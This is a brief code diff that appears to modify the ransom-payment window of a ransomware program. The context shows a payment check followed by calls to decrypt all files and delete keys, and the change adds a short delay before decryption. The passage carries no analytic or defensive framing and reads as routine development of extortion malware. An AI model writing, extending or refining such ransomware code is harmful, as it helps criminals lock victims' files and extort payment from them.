@@ -82,6 +82,7 @@ def timer_window():
                 paid = data.get('paid', False)
                 if paid:
                     result_label.config(text="Payment received", fg="green")
+                    time.sleep(5)
                     decrypt_all_files()
                     delete_keys()
                     time.sleep(10)
